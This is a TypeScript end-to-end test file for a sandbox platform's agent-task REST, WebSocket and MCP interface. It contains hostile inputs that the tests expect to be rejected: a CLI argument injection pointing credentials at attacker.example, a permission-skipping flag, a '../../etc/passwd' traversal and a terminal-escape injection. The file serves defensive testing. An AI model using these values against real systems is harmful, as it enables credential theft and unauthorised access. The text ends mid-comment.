import { beforeAll, afterAll, describe, it, expect } from 'vitest';
import request from 'supertest';
import { Test } from '@nestjs/testing';
import type { INestApplication } from '@nestjs/common';
import { io, type Socket } from 'socket.io-client';
import {
  PROJECT_FACADE,
  IMAGE_SPEC_REGISTRY,
  SANDBOX_PROVIDER_REGISTRY,
  WORKSPACE_PREPARER,
  WS_TASKS_SCHEMA_HASH,
} from '@platform/contracts';
import type { AgentTaskDto, TaskClientFrame, TaskServerFrame } from '@platform/contracts';
import { SandboxMcpTools } from '@platform/sandbox';
import { AppModule } from '../../src/app.module';
import { useEnv } from './_env';
import { setupWebsockets } from '../../src/bootstrap/websocket.setup';
import { configurePlatformApp } from '../../src/bootstrap/configure-app';
import {
  FakeProvider,
  makeFakeImageSpecRegistry,
  registerDefaultImage,
  fakeProjectFacade,
  fakeWorkspace,
  makeFakeRegistry,
  makeNoHeadlessProvider,
} from './_fakes';

/**
 * The headless Task INTERFACE leg (S6): REST + `/tasks` WS + MCP, on in-memory doubles
 * so the whole surface is proven without a docker daemon. The real container proof of
 * the job/file planes underneath is `agent-task-job-plane.e2e-spec.ts`.
 *
 * ⚠️ THIS IS THE FIRST TIME THE PLATFORM LETS AN OUTSIDE CALLER EXECUTE SOMETHING.
 * Before S6, REST and MCP could only create, list and destroy sandboxes. So the
 * admission checks and the argv whitelist are asserted here as first-class behaviour,
 * not as an afterthought.
 */
let app: INestApplication;
let port: number;
let restoreEnv: () => void;
let registryProviders: { aio: FakeProvider; noHeadless: FakeProvider };

const PROJECT = 'prj-tasks';
const RUNTIME = 'claude-code';

/** A claude stream-json line, the shape the platform really parses. */
const initLine = (id: string) =>
  `${JSON.stringify({ type: 'system', subtype: 'init', session_id: id })}\n`;
const textLine = (text: string) =>
  `${JSON.stringify({ type: 'assistant', message: { content: [{ type: 'text', text }] } })}\n`;
const resultLine = () =>
  `${JSON.stringify({ type: 'result', subtype: 'success', is_error: false })}\n`;

beforeAll(async () => {
  restoreEnv = useEnv({ DATABASE_URL: ':memory:', ACCESS_PASSCODE: undefined });
  const aio = new FakeProvider('aio');
  const noHeadless = makeNoHeadlessProvider();
  registryProviders = { aio, noHeadless };
  const registry = makeFakeRegistry([aio, noHeadless]);
  const moduleRef = await Test.createTestingModule({ imports: [AppModule] })
    .overrideProvider(SANDBOX_PROVIDER_REGISTRY)
    .useValue(registry)
    .overrideProvider(WORKSPACE_PREPARER)
    .useValue(fakeWorkspace)
    .overrideProvider(PROJECT_FACADE)
    .useValue(fakeProjectFacade)
    // The create door demands a REGISTERED image since 04 §7 时刻③. The whole image
    // chain stays real here — only the registry round-trip is faked, because an e2e
    // must not need a reachable registry.
    .overrideProvider(IMAGE_SPEC_REGISTRY)
    .useValue(makeFakeImageSpecRegistry())
    .compile();
  app = moduleRef.createNestApplication();
  configurePlatformApp(app);
  setupWebsockets(app);
  await app.init();
  await app.listen(0);
  // The create door needs a REGISTERED image now (04 §7 时刻③); register the
  // platform default once so the creates below can omit `image` as they always did.
  await registerDefaultImage(app);
  const addr = app.getHttpServer().address();
  port = typeof addr === 'object' && addr ? addr.port : 0;
});

afterAll(async () => {
  await app?.close();
  restoreEnv?.();
});

const http = () => request(app.getHttpServer());

/** Create a sandbox and wait until provisioning has driven it to `running`. */
async function runningSandbox(provider = 'aio'): Promise<string> {
  const created = await http()
    .post('/api/sandboxes')
    .send({ projectId: PROJECT, runtime: RUNTIME, provider })
    .expect(201);
  const id = String(created.body.id);
  for (let i = 0; i < 200; i++) {
    const res = await http().get(`/api/sandboxes/${id}`).expect(200);
    if (res.body.status === 'running') return id;
    await new Promise((r) => setTimeout(r, 10));
  }
  throw new Error(`sandbox ${id} never reached running`);
}

/**
 * Poll until `predicate` holds. It AWAITS the predicate — an async one returns a
 * Promise, and a Promise is always truthy, so a non-awaiting version would return on
 * the first tick and hand every later assertion a half-built world.
 */
async function waitFor(
  predicate: () => boolean | Promise<boolean>,
  what: string,
  ms = 4000,
): Promise<void> {
  const deadline = Date.now() + ms;
  while (Date.now() < deadline) {
    if (await predicate()) return;
    await new Promise((r) => setTimeout(r, 10));
  }
  throw new Error(`timed out waiting for ${what}`);
}

/**
 * ⚠️ `sandboxId` IS A REQUIRED ARGUMENT because it is a required part of the handshake:
 * `/tasks` refuses a socket that does not declare which sandbox it is watching. Giving
 * it a default here would let a test drift back to the un-scoped shape without saying so.
 */
function connectTasks(sandboxId: string, query: Record<string, string> = {}): Promise<Socket> {
  const sock = io(`http://127.0.0.1:${port}/tasks`, {
    query: { xSchemaHash: WS_TASKS_SCHEMA_HASH, sandboxId, ...query },
    transports: ['websocket'],
    forceNew: true,
  });
  return new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error('connect timeout /tasks')), 4000);
    sock.on('connect', () => {
      clearTimeout(t);
      resolve(sock);
    });
    sock.on('connect_error', (e) => {
      clearTimeout(t);
      reject(e);
    });
  });
}

function send(sock: Socket, frame: TaskClientFrame): void {
  sock.emit('frame', frame);
}

/** Connect expecting the handshake to be REFUSED, and hand back the error. */
function refusedHandshake(query: Record<string, string>): Promise<Error> {
  const sock = io(`http://127.0.0.1:${port}/tasks`, {
    query,
    transports: ['websocket'],
    forceNew: true,
    reconnection: false,
  });
  return new Promise((resolve, reject) => {
    const t = setTimeout(() => {
      sock.disconnect();
      reject(new Error('handshake was not refused'));
    }, 4000);
    sock.on('connect_error', (e: Error) => {
      clearTimeout(t);
      sock.disconnect();
      resolve(e);
    });
    sock.on('connect', () => {
      clearTimeout(t);
      sock.disconnect();
      reject(new Error('handshake was ACCEPTED'));
    });
  });
}

describe('POST /api/sandboxes/:id/runtimes/:rt/tasks', () => {
  it('answers 202 with the task id and a `running` state', async () => {
    const sandboxId = await runningSandbox();
    const res = await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'summarise the diff' })
      .expect(202);
    const dto = res.body as AgentTaskDto;
    // 202, not 201: the run is ACCEPTED and now in flight; it may last four hours.
    expect(dto.id).toBeTruthy();
    expect(dto.status).toBe('running');
    expect(dto.sandboxId).toBe(sandboxId);
    expect(dto.lastSeq).toBe(0);
    // the hard-timeout budget rides the DTO so a client can render a countdown rather
    // than just an elapsed clock.
    expect(dto.timeoutMinutes).toBe(30);
  });

  it('REFUSES an `extraArgs` value outside the whitelist (400)', async () => {
    const sandboxId = await runningSandbox();
    // the whole point of the enum: an arbitrary flag would be appended to the CLI's
    // argv, i.e. arbitrary execution for anyone who can reach this endpoint.
    await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'go', extraArgs: ['--dangerously-skip-permissions'] })
      .expect(400);
    await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'go', extraArgs: ['--verbose'] })
      .expect(202);
  });

  it('refuses an empty prompt and one past the 8000-character ceiling (400)', async () => {
    const sandboxId = await runningSandbox();
    await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: '' })
      .expect(400);
    await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'x'.repeat(8001) })
      .expect(400);
  });

  it('REFUSES a `resumeFrom` that is not a CLI session id (400)', async () => {
    const sandboxId = await runningSandbox();
    // ⚠️ THE ACTUAL EXPLOIT, not a hypothetical: `resumeFrom` is a POSITIONAL of
    // `codex exec resume`, so a value starting with `-` is parsed as an OPTION — and
    // `-cmodel_provider.base_url=…` is a codex config override. codex's credentials sit
    // in `~/.codex/auth.json`, so accepting this would send the injected key to an
    // attacker's endpoint, straight past the `extraArgs` whitelist.
    await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'go', resumeFrom: '-cmodel_provider.base_url=http://attacker.example/v1' })
      .expect(400);
    // an arbitrary opaque string is refused too — the rule is a FORMAT, not a `-` filter.
    await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'go', resumeFrom: 'whatever-i-like' })
      .expect(400);
    // …and the shape both CLIs really emit still works.
    await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'go', resumeFrom: '01996b8f-4d21-7a0c-9f3e-2c5d8a1b7e40' })
      .expect(202);
  });

  it('refuses a timeout tier that is not one of the four (400)', async () => {
    const sandboxId = await runningSandbox();
    await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'go', timeoutMinutes: 45 })
      .expect(400);
  });
});

describe('the headless admission branch (04 §2.6, 409)', () => {
  it('a headless sandbox on a provider WITHOUT the two planes is refused up front', async () => {
    const res = await http()
      .post('/api/sandboxes')
      .send({
        projectId: PROJECT,
        runtime: RUNTIME,
        provider: registryProviders.noHeadless.name,
        headless: true,
        timeoutMinutes: 30,
      })
      .expect(409);
    expect(res.body.code).toBe('UNSUPPORTED_CAPABILITY');
  });

  it('…while an INTERACTIVE sandbox on the same provider is still fine', async () => {
    await http()
      .post('/api/sandboxes')
      .send({ projectId: PROJECT, runtime: RUNTIME, provider: registryProviders.noHeadless.name })
      .expect(201);
  });

  it('`GET /api/providers` reports the bit, and the sandbox DTO reports its provider', async () => {
    const providers = await http().get('/api/providers').expect(200);
    const aio = providers.body.find((p: { name: string }) => p.name === 'aio');
    expect(aio.capabilities.headlessTask).toBe(true);
    // the frontend needs the provider name to look those capabilities up after a reload.
    const sandboxId = await runningSandbox();
    const sandbox = await http().get(`/api/sandboxes/${sandboxId}`).expect(200);
    expect(sandbox.body.provider).toBe('aio');
  });
});

/**
 * The rest of the create door (04 §5 「创建前静态校验」), asserted ON THE WIRE next to
 * the 409 above — the two registries and the field lengths are one gate, and a caller
 * only ever meets it as an HTTP status.
 */
describe('the create door: the open registries and the field ceilings (04 §5 / 14 §10)', () => {
  it('REFUSES a runtime that is not registered — 400, synchronously, not a failed sandbox', async () => {
    // ⚠️ THE REGRESSION THIS PINS. `runtime` is `z.string().min(1)` because the adapter
    // registry is an open set (04 §8), so `'shell'` type-checks on both sides of the
    // wire — a real frontend shipped exactly that, and every sandbox created from that
    // entry point 201'd, then died in the ASYNC provision as `INSTALL_FAILED`.
    // 201-then-fail and 400 are not the same answer: only one of them is true.
    const res = await http()
      .post('/api/sandboxes')
      .send({ projectId: PROJECT, runtime: 'shell' })
      .expect(400);
    expect(String(res.body.message)).toMatch(/unknown runtime/i);
    // …and it arrives as a REAL envelope, which is what makes that sentence readable.
    expect(res.body).toMatchObject({
      code: 'UNKNOWN_RUNTIME',
      retryable: false,
      sideEffectFree: true,
    });
  });

  it('REFUSES an unknown provider the same way (the sibling registry, unchanged)', async () => {
    const res = await http()
      .post('/api/sandboxes')
      .send({ projectId: PROJECT, runtime: RUNTIME, provider: 'nope' })
      .expect(400);
    expect(res.body).toMatchObject({
      code: 'UNKNOWN_PROVIDER',
      retryable: false,
      sideEffectFree: true,
    });
  });

  it('REFUSES an image reference carrying a control character', async () => {
    const res = await http()
      .post('/api/sandboxes')
      // built from an escape, never pasted raw (a literal 0x1b makes git treat the file
      // as binary): an ESC in a ref is a terminal-escape injection into every log.
      .send({
        projectId: PROJECT,
        runtime: RUNTIME,
        image: `alpine:3.20${String.fromCharCode(0x1b)}[2J`,
      })
      .expect(400);
    expect(res.body).toMatchObject({
      code: 'INVALID_IMAGE_REFERENCE',
      retryable: false,
      sideEffectFree: true,
    });
  });

  /**
   * ⚠️ THE ONE THIS ENDPOINT MOST NEEDED, AND THE REASON THE FIELD EXISTS ON THE WIRE
   * RATHER THAN IN THE FRONTEND'S HEAD (shared/10 §6.8).
   *
   * All four rejections above are 零副作用 — nothing was scheduled, stored or handed to
   * `provider.create`, so there is no sandbox id and no `failed` row for the user to
   * find. The frontend used to tell them apart from real failures by `httpStatus === 409`,
   * a proxy that matched only ONE of them; the other three were rendered as "创建失败，
   * 可重试" about requests that created nothing. `sideEffectFree` is the platform stating
   * the fact instead of the client guessing at it — asserted HERE, on the wire, because
   * that is the only place the guess used to be made.
   */
  it('every create-door rejection carries `sideEffectFree` — the 409 included', async () => {
    const res = await http()
      .post('/api/sandboxes')
      .send({
        projectId: PROJECT,
        runtime: RUNTIME,
        provider: registryProviders.noHeadless.name,
        headless: true,
        timeoutMinutes: 30,
      })
      .expect(409);
    expect(res.body).toMatchObject({
      code: 'UNSUPPORTED_CAPABILITY',
      retryable: false,
      sideEffectFree: true,
    });
  });

  it('holds `initialPrompt` to the SAME 8000 ceiling the task prompt has (10 §7.3)', async () => {
    // The two are one 口径 in the contract; while only the task side enforced it, the
    // same text was bounded through `POST .../tasks` and unbounded through
    // `POST /api/sandboxes` — where it is persisted and later concatenated into argv.
    await http()
      .post('/api/sandboxes')
      .send({ projectId: PROJECT, runtime: RUNTIME, initialPrompt: 'x'.repeat(8001) })
      .expect(400);
    await http()
      .post('/api/sandboxes')
      .send({ projectId: PROJECT, runtime: RUNTIME, initialPrompt: 'x'.repeat(8000) })
      .expect(201);
  });
});

describe('GET the task, its history, and its artifacts', () => {
  it('lands the exit code, records the session ref and serves the artifact bytes', async () => {
    const sandboxId = await runningSandbox();
    const started = await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'write a report' })
      .expect(202);
    const taskId = String(started.body.id);

    const plane = registryProviders.aio.jobs!;
    const files = registryProviders.aio.files!;
    const job = plane.latest();
    files.files.set('/workspace/.agent-artifacts/report.md', Buffer.from('# done\n', 'utf8'));
    job.emit(initLine('sess-e2e-1') + textLine('all set') + resultLine());
    job.finish(0);
    await waitFor(() => plane.released.length > 0, 'the job to be released');

    const dto = (await http().get(`/api/sandboxes/${sandboxId}/tasks/${taskId}`).expect(200))
      .body as AgentTaskDto;
    expect(dto.status).toBe('succeeded');
    expect(dto.timeoutMinutes).toBe(30);
    expect(dto.exitCode).toBe(0);
    expect(dto.sessionRef).toBe('sess-e2e-1');
    expect(dto.artifacts).toEqual([
      { name: 'report.md', size: 7, modifiedAt: '2026-08-22T00:00:00.000Z' },
    ]);

    const download = await http()
      .get(`/api/sandboxes/${sandboxId}/tasks/${taskId}/artifacts/report.md`)
      .expect(200);
    expect(download.headers['content-type']).toContain('application/octet-stream');
    expect(download.text ?? download.body.toString()).toContain('# done');
    // ⚠️ AND THE TOTAL SIZE, so a streaming downloader can draw a progress bar. It must
    // be the byte count of what actually arrives: a `content-length` that disagrees with
    // the body is worse than none at all — the browser truncates at it or hangs waiting
    // for bytes that never come.
    expect(download.headers['content-length']).toBe('7');
  });

  it('measures the artifact at OPEN time, not from what collection remembered', async () => {
    const sandboxId = await runningSandbox();
    const started = await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'write a report' })
      .expect(202);
    const taskId = String(started.body.id);
    const plane = registryProviders.aio.jobs!;
    const files = registryProviders.aio.files!;
    const path = '/workspace/.agent-artifacts/grown.md';
    files.files.set(path, Buffer.from('small', 'utf8'));
    // `released` is CUMULATIVE across the file's tests, so the baseline has to be taken:
    // `> 0` would already be true from an earlier run and let this one read a half-built
    // world.
    const released = plane.released.length;
    plane.latest().finish(0);
    await waitFor(() => plane.released.length > released, 'the job to be released');

    const recorded = (
      (await http().get(`/api/sandboxes/${sandboxId}/tasks/${taskId}`)).body as AgentTaskDto
    ).artifacts.find((a) => a.name === 'grown.md');
    expect(recorded?.size).toBe(5);

    // the drop box is a real directory in someone else's filesystem; the size collection
    // recorded is a fact about the PAST. Serve the past number and the download breaks.
    files.files.set(path, Buffer.from('a much longer body than before', 'utf8'));
    const download = await http()
      .get(`/api/sandboxes/${sandboxId}/tasks/${taskId}/artifacts/grown.md`)
      .expect(200);
    expect(download.headers['content-length']).toBe('30');
    expect(Buffer.byteLength(download.text ?? download.body.toString())).toBe(30);
  });

  it('lists the sandbox’s runs — the only authority after a page reload', async () => {
    const sandboxId = await runningSandbox();
    const first = await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'turn one' })
      .expect(202);
    registryProviders.aio.jobs!.latest().finish(0);
    await waitFor(
      async () =>
        (await http().get(`/api/sandboxes/${sandboxId}/tasks/${first.body.id}`)).body.status !==
        'running',
      'the first run to land',
    );

    const listed = await http().get(`/api/sandboxes/${sandboxId}/tasks`).expect(200);
    expect(Array.isArray(listed.body)).toBe(true);
    expect(listed.body.map((t: AgentTaskDto) => t.id)).toContain(String(first.body.id));
  });

  it('refuses a traversing artifact name and 404s an unknown one', async () => {
    const sandboxId = await runningSandbox();
    const started = await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'go' })
      .expect(202);
    const taskId = String(started.body.id);
    // an absolute path / a `..` climb would resolve into the workspace — or into the
    // injected credential file. Refused before anything is opened.
    await http()
      .get(
        `/api/sandboxes/${sandboxId}/tasks/${taskId}/artifacts/${encodeURIComponent('../../etc/passwd')}`,
      )
      .expect(400);
    await http()
      .get(`/api/sandboxes/${sandboxId}/tasks/${taskId}/artifacts/nothing.txt`)
      .expect(404);
  });

  it('a task addressed under the WRONG sandbox is a 404', async () => {
    const a = await runningSandbox();
    const b = await runningSandbox();
    const started = await http()
      .post(`/api/sandboxes/${a}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'go' })
      .expect(202);
    await http().get(`/api/sandboxes/${b}/tasks/${started.body.id}`).expect(404);
  });
});

describe('POST …/tasks/:taskId/cancel — the stop button', () => {
  it('accepts with 202, signals SIGTERM, and lands `killed`', async () => {
    const sandboxId = await runningSandbox();
    const started = await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'a very long one', timeoutMinutes: 240 })
      .expect(202);
    const taskId = String(started.body.id);
    const plane = registryProviders.aio.jobs!;
    const before = plane.released.length;

    await http().post(`/api/sandboxes/${sandboxId}/tasks/${taskId}/cancel`).send({}).expect(202);
    expect(plane.kills.at(-1)?.signal).toBe('SIGTERM');

    await waitFor(() => plane.released.length > before, 'the cancelled job to finalise');
    const dto = (await http().get(`/api/sandboxes/${sandboxId}/tasks/${taskId}`).expect(200))
      .body as AgentTaskDto;
    // `killed`, not `failed`: a signal-killed process has no exit code, so without the
    // recorded intent a deliberate stop is indistinguishable from a crash.
    expect(dto.status).toBe('killed');
    expect(dto.exitCode).toBeUndefined();
  });

  it('cancelling an already-finished task is a 409, not a silent no-op', async () => {
    const sandboxId = await runningSandbox();
    const started = await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'go' })
      .expect(202);
    const taskId = String(started.body.id);
    const plane = registryProviders.aio.jobs!;
    const before = plane.released.length;
    plane.latest().finish(0);
    await waitFor(() => plane.released.length > before, 'completion');
    await http().post(`/api/sandboxes/${sandboxId}/tasks/${taskId}/cancel`).send({}).expect(409);
  });
});

describe('/tasks WS channel', () => {
  it('replays from fromSeq, announces caught_up, then pushes live and exits', async () => {
    const sandboxId = await runningSandbox();
    const started = await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'stream me' })
      .expect(202);
    const taskId = String(started.body.id);
    const plane = registryProviders.aio.jobs!;
    const job = plane.latest();

    // two events land BEFORE anyone subscribes — they must be replayed, not lost.
    job.emit(initLine('sess-ws-1') + textLine('first'));
    await waitFor(
      async () =>
        ((await http().get(`/api/sandboxes/${sandboxId}/tasks/${taskId}`)).body as AgentTaskDto)
          .lastSeq >= 2,
      'the first two events to be produced',
    );

    const sock = await connectTasks(sandboxId);
    const frames: TaskServerFrame[] = [];
    sock.on('frame', (f: TaskServerFrame) => frames.push(f));
    send(sock, { type: 'subscribe', taskId });

    await waitFor(() => frames.some((f) => f.type === 'caught_up'), 'caught_up');
    const caught = frames.find((f) => f.type === 'caught_up');
    expect(caught).toMatchObject({ type: 'caught_up', taskId, firstSeq: 1, seq: 2 });
    const replayed = frames.filter((f) => f.type === 'event');
    expect(replayed.map((f) => (f.type === 'event' ? f.seq : 0))).toEqual([1, 2]);

    // …and now LIVE.
    job.emit(textLine('second'));
    job.finish(0);
    await waitFor(() => frames.some((f) => f.type === 'exit'), 'the exit frame');
    const seqs = frames
      .filter((f) => f.type === 'event')
      .map((f) => (f.type === 'event' ? f.seq : 0));
    // dense and monotonic, with no repeat across the replay→live handoff.
    expect(seqs).toEqual([1, 2, 3]);
    expect(frames.find((f) => f.type === 'exit')).toMatchObject({
      status: 'succeeded',
      exitCode: 0,
    });
    sock.disconnect();
  });

  it('`fromSeq` is EXCLUSIVE — it sends what comes after, not including it', async () => {
    const sandboxId = await runningSandbox();
    const started = await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'stream me' })
      .expect(202);
    const taskId = String(started.body.id);
    const job = registryProviders.aio.jobs!.latest();
    job.emit(initLine('sess-ws-2') + textLine('a') + textLine('b'));
    job.finish(0);
    await waitFor(
      async () =>
        ((await http().get(`/api/sandboxes/${sandboxId}/tasks/${taskId}`)).body as AgentTaskDto)
          .status !== 'running',
      'the run to land',
    );

    const sock = await connectTasks(sandboxId);
    const frames: TaskServerFrame[] = [];
    sock.on('frame', (f: TaskServerFrame) => frames.push(f));
    send(sock, { type: 'subscribe', taskId, fromSeq: 2 });
    await waitFor(() => frames.some((f) => f.type === 'caught_up'), 'caught_up');

    const seqs = frames
      .filter((f) => f.type === 'event')
      .map((f) => (f.type === 'event' ? f.seq : 0));
    expect(seqs).toEqual([3]);
    // firstSeq proves the head is where the subscriber asked for it to be.
    expect(frames.find((f) => f.type === 'caught_up')).toMatchObject({ firstSeq: 3 });

    // ⚠️ a LATE subscriber to a FINISHED task must still be told it finished — the live
    // exit frame fired long ago.
    await waitFor(() => frames.some((f) => f.type === 'exit'), 'the re-sent exit frame');
    sock.disconnect();
  });

  it('subscribing to an unknown task answers a CODE, and still ENDS the replay', async () => {
    // the handshake only requires that a sandbox be NAMED; whether it exists is settled
    // at `subscribe`, and here the task does not exist either way.
    const sock = await connectTasks('sbx-no-such-sandbox');
    const frames: TaskServerFrame[] = [];
    sock.on('frame', (f: TaskServerFrame) => frames.push(f));
    send(sock, { type: 'subscribe', taskId: 'no-such-task', fromSeq: 7 });
    await waitFor(() => frames.some((f) => f.type === 'error'), 'the error frame');
    expect(frames.find((f) => f.type === 'error')).toMatchObject({ code: 'NOT_FOUND' });
    // ⚠️ AND A TERMINATING FRAME. `caught_up` is the only thing that ends the
    // "回放中" phase, and an unknown task will never produce an `exit` either — so a
    // bare `error` leaves the panel spinning until the tab is closed.
    await waitFor(() => frames.some((f) => f.type === 'caught_up'), 'the terminating frame');
    expect(frames.find((f) => f.type === 'caught_up')).toMatchObject({ firstSeq: 8, seq: 7 });
    sock.disconnect();
  });

  it('a socket that subscribes TWICE gets each event exactly once', async () => {
    const sandboxId = await runningSandbox();
    const started = await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'stream me' })
      .expect(202);
    const taskId = String(started.body.id);
    const job = registryProviders.aio.jobs!.latest();
    job.emit(initLine('sess-ws-dup') + textLine('a') + textLine('b'));
    await waitFor(
      async () =>
        ((await http().get(`/api/sandboxes/${sandboxId}/tasks/${taskId}`)).body as AgentTaskDto)
          .lastSeq >= 3,
      'three events to exist',
    );

    const sock = await connectTasks(sandboxId);
    const frames: TaskServerFrame[] = [];
    sock.on('frame', (f: TaskServerFrame) => frames.push(f));
    // ⚠️ THE FRONTEND DOES THIS ON EVERY RECONNECT — it re-sends `subscribe` on each
    // `open`. Both land on the same socket id, so the second REPLACED the first in the
    // map while the first replay loop kept delivering from its own de-dup counter.
    send(sock, { type: 'subscribe', taskId });
    send(sock, { type: 'subscribe', taskId });
    await waitFor(() => frames.some((f) => f.type === 'caught_up'), 'the replay to finish');
    job.emit(textLine('live'));
    job.finish(0);
    await waitFor(() => frames.some((f) => f.type === 'exit'), 'the exit frame');
    // let anything the superseded loop would still have sent actually arrive.
    await new Promise((r) => setTimeout(r, 150));

    const seqs = frames
      .filter((f) => f.type === 'event')
      .map((f) => (f.type === 'event' ? f.seq : 0))
      .sort((a, b) => a - b);
    // ⚠️ EVERY EVENT EXACTLY ONCE. The second `subscribe` replaces the first in the
    // `client.id`-keyed map, but the FIRST replay loop is still running and still holds
    // the first Subscription — and `deliveredSeq`, the de-duplication key, lives ON that
    // object. Two live objects ⇒ two independent counters ⇒ two copies of every event.
    expect(seqs).toEqual([1, 2, 3, 4]);
    // exactly ONE replay reaches the socket: the superseded one stops where it is
    // rather than finishing and announcing a second `caught_up`.
    expect(frames.filter((f) => f.type === 'caught_up')).toHaveLength(1);
    expect(frames.filter((f) => f.type === 'exit')).toHaveLength(1);
    sock.disconnect();
  });

  it('refuses a client that presents NO frame-schema hash at all', async () => {
    // The old check was `presented !== undefined && presented !== HASH`, so omitting the
    // header was a free pass — i.e. it could only ever catch a client that was already
    // being careful, which is the one that does not need catching.
    //
    // ⚠️ THIS HANDSHAKE IS ALSO MISSING `sandboxId`, and it still hears SCHEMA_MISMATCH:
    // the schema check runs FIRST on purpose. A client on the previous protocol
    // generation is missing both, and "your client is out of date" is the diagnosis that
    // actually explains it — "you forgot a query parameter" sends it after the smaller
    // of its two problems.
    const err = await refusedHandshake({});
    expect(err.message.startsWith('SCHEMA_MISMATCH')).toBe(true);
    expect(err.message).toContain('got none');
  });

  it('the refusal arrives as connect_error, not as a frame on a dying socket', async () => {
    // ⚠️ WHY MIDDLEWARE AND NOT `handleConnection` + `disconnect(true)`: emitting a
    // frame and then tearing the transport down is a race the server cannot win — the
    // client may never see the frame. `connect_error` is delivery socket.io guarantees,
    // and it fires before the socket joins the namespace, so there is nothing to unwind.
    const sock = io(`http://127.0.0.1:${port}/tasks`, {
      query: { xSchemaHash: 'nope' },
      transports: ['websocket'],
      forceNew: true,
      reconnection: false,
    });
    const frames: TaskServerFrame[] = [];
    sock.on('frame', (f: TaskServerFrame) => frames.push(f));
    const outcome = await new Promise<string>((resolve) => {
      const t = setTimeout(() => resolve('nothing'), 3000);
      sock.on('connect_error', () => {
        clearTimeout(t);
        resolve('connect_error');
      });
      sock.on('connect', () => {
        clearTimeout(t);
        resolve('connected');
      });
    });
    expect(outcome).toBe('connect_error');
    expect(frames).toEqual([]);
    sock.disconnect();
  });

  it('refuses a handshake that declares NO sandbox, with its OWN code', async () => {
    // ⚠️ THE HOLE THIS CLOSES. While the scope was optional, omitting `sandboxId` was a
    // free pass to `subscribe` to ANY task in the deployment by id — so the rule bound
    // only the client that was already scoping itself, i.e. the one that did not need
    // binding. Exactly the shape the schema-hash check used to have.
    const err = await refusedHandshake({ xSchemaHash: WS_TASKS_SCHEMA_HASH });
    expect(err.message.startsWith('SANDBOX_REQUIRED')).toBe(true);
    expect((err as Error & { data?: { code?: string } }).data?.code).toBe('SANDBOX_REQUIRED');
    // ⚠️ SAME RULE AS `SCHEMA_MISMATCH`: the client's shared "is this unauthorized?"
    // helper is a prose regex, and a missing query parameter read as an auth failure
    // pops the unlock dialog — which cannot add a parameter the client itself omitted.
    expect(err.message).not.toMatch(/unauthor|forbidden|passcode|401|403/i);
    // an EMPTY one is not a declaration either.
    const empty = await refusedHandshake({ xSchemaHash: WS_TASKS_SCHEMA_HASH, sandboxId: '' });
    expect(empty.message.startsWith('SANDBOX_REQUIRED')).toBe(true);
  });

  it('holds EVERY socket to the sandbox it declared (parity with REST)', async () => {
    const sandboxId = await runningSandbox();
    const started = await http()
      .post(`/api/sandboxes/${sandboxId}/runtimes/${RUNTIME}/tasks`)
      .send({ prompt: 'scoped' })
      .expect(202);
    const taskId = String(started.body.id);

    // REST answers 404 for a task addressed under the wrong sandbox; a socket that
    // declares the same scope must not be a way around that.
    const sock = await connectTasks('sbx-somebody-else');
    const frames: TaskServerFrame[] = [];
    sock.on('frame', (f: TaskServerFrame) => frames.push(f));
    send(sock, { type: 'subscribe', taskId });
    await waitFor(() => frames.some((f) => f.type === 'error'), 'the scoped refusal');
    expect(frames.find((f) => f.type === 'error')).toMatchObject({ code: 'NOT_FOUND' });
    expect(frames.some((f) => f.type === 'event')).toBe(false);
    sock.disconnect();

    // …and the RIGHT scope still works.
    const ok = await connectTasks(sandboxId);
    const okFrames: TaskServerFrame[] = [];
    ok.on('frame', (f: TaskServerFrame) => okFrames.push(f));
    send(ok, { type: 'subscribe', taskId });
    await waitFor(() => okFrames.some((f) => f.type === 'caught_up'), 'caught_up');
    expect(okFrames.some((f) => f.type === 'error')).toBe(false);
    ok.disconnect();
  });

  it('refuses a client whose frame-schema hash disagrees, with a MACHINE-READABLE code', async () => {
    const err = await refusedHandshake({ xSchemaHash: 'sb-tasks-FROM-THE-FUTURE' });
    // ⚠️ THE CODE LEADS THE MESSAGE. The client dispatches on the text, and its shared
    // "is this unauthorized?" helper is a prose regex — a schema mismatch read as an
    // auth failure pops the unlock dialog, i.e. sends the user to do the one thing that
    // cannot possibly help a protocol-version drift.
    expect(err.message.startsWith('SCHEMA_MISMATCH')).toBe(true);
    expect(err.message).toContain('sb-tasks-v1');
    expect((err as Error & { data?: { code?: string } }).data?.code).toBe('SCHEMA_MISMATCH');
    // the words the client's unauthorized-matcher looks for must NOT be in here.
    expect(err.message).not.toMatch(/unauthor|forbidden|passcode|401|403/i);
  });
});

describe('MCP tool面 — one application, two protocol shells (02 §5)', () => {
  /**
   * The tool shell is resolved from the SAME Nest container the REST controller lives
   * in and driven directly, which is what an e2e can actually prove here: that the MCP
